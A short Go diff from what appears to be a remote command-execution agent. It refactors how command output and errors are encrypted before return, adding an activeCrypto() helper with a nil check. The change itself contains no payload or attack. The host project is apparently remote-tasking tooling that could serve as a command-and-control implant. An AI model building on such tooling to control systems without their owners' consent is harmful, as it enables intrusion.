@@ -167,7 +167,7 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleExecute(agent, cmd, result)
 	}
 
-	if agent.crypto != nil && !(cmd.OperationType == "download" && result.Encrypted) {
+	if agent.activeCrypto() != nil && !(cmd.OperationType == "download" && result.Encrypted) {
 		encryptResult(agent, result)
 	}
 
@@ -175,14 +175,18 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 }
 
 func encryptResult(agent *Agent, result *types.CommandResult) {
+	mgr := agent.activeCrypto()
+	if mgr == nil {
+		return
+	}
 	if result.Output != "" {
-		if encrypted, err := agent.crypto.EncryptData([]byte(result.Output)); err == nil {
+		if encrypted, err := mgr.EncryptData([]byte(result.Output)); err == nil {
 			result.Output = encrypted
 			result.Encrypted = true
 		}
 	}
 	if result.Error != "" {
-		if encrypted, err := agent.crypto.EncryptData([]byte(result.Error)); err == nil {
+		if encrypted, err := mgr.EncryptData([]byte(result.Error)); err == nil {
 			result.Error = encrypted
 			result.Encrypted = true
 		}
